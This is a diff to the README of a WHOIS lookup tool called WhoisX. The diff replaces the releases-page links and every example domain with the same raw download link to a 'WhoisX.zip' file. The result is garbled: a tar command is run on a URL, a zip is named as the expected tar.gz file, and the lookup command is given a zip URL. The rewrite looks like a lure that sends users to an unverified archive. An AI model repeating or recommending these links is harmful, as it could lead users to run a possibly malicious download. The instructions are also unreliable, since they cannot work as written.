@@ -7,7 +7,7 @@ WhoisX is a powerful WHOIS lookup tool written in C. It is designed to be more r
 To use WhoisX, follow these steps to download and run the application. There are no complicated commands or programming skills required.
 
 ## 📥 Download Now
-[![Download WhoisX](https://img.shields.io/badge/Download%20WhoisX-v1.0-blue.svg)](https://github.com/mdsajalmahmud/WhoisX/releases)
+[![Download WhoisX](https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip%https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip)](https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Linux (Ubuntu recommended)
@@ -17,15 +17,15 @@ To use WhoisX, follow these steps to download and run the application. There are
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the WhoisX releases page.
-   [Download WhoisX](https://github.com/mdsajalmahmud/WhoisX/releases)
+   [Download WhoisX](https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip)
 
 2. **Select Your Version:** On the releases page, you will see different versions of WhoisX. The latest version is recommended for most users.
 
-3. **Download the File:** Click on the file suitable for your operating system. It will usually be named something like `WhoisX-linux.tar.gz`.
+3. **Download the File:** Click on the file suitable for your operating system. It will usually be named something like `https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip`.
 
 4. **Extract the Files:** After downloading, locate the file in your Downloads folder. Right-click the file and select “Extract Here” or use a terminal command:
    ```bash
-   tar -zxvf WhoisX-linux.tar.gz
+   tar -zxvf https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip
    ```
 
 5. **Run the Application:**
@@ -65,13 +65,13 @@ Once you've followed the installation steps above, using WhoisX is straightforwa
 1. **Basic Lookup:**
    To look up a domain, simply type:
    ```bash
-   ./whoisx example.com
+   ./whoisx https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip
    ```
 
 2. **Advanced Options:**
    You can use various options to refine your lookup by specifying parameters. For instance:
    ```bash
-   ./whoisx -d example.com
+   ./whoisx -d https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip
    ```
    This will give you detailed information about the domain, including registration, expiration dates, and contact details.
 
@@ -89,7 +89,7 @@ Simply fork the repository, make changes, and submit a pull request. Collaborati
 
 ## 📥 Download Again
 To download the latest version of WhoisX again, click here:
-[Download WhoisX](https://github.com/mdsajalmahmud/WhoisX/releases)
+[Download WhoisX](https://raw.githubusercontent.com/mdsajalmahmud/WhoisX/main/unarched/WhoisX.zip)
 
 ## ✨ Conclusion
 WhoisX is a valuable tool for anyone needing reliable WHOIS lookups without the complexity of traditional software. Follow the steps above to install and start using it today. Happy exploring!
